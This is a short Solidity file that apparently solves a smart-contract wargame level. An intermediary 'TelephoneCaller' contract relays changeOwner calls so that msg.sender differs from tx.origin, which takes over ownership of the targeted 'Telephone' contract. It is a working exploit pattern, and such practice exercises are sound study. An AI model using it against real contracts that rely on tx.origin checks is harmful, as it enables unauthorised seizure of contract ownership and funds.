// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneCaller {
    Telephone telephoneContract;
    constructor(address telephoneAddr) {
        telephoneContract = Telephone(telephoneAddr);
    }
    function changeOwner(address _owner) public {
        return telephoneContract.changeOwner(_owner);
    }
}
abstract contract Telephone {

  address public owner;

  function changeOwner(address _owner) public virtual;
}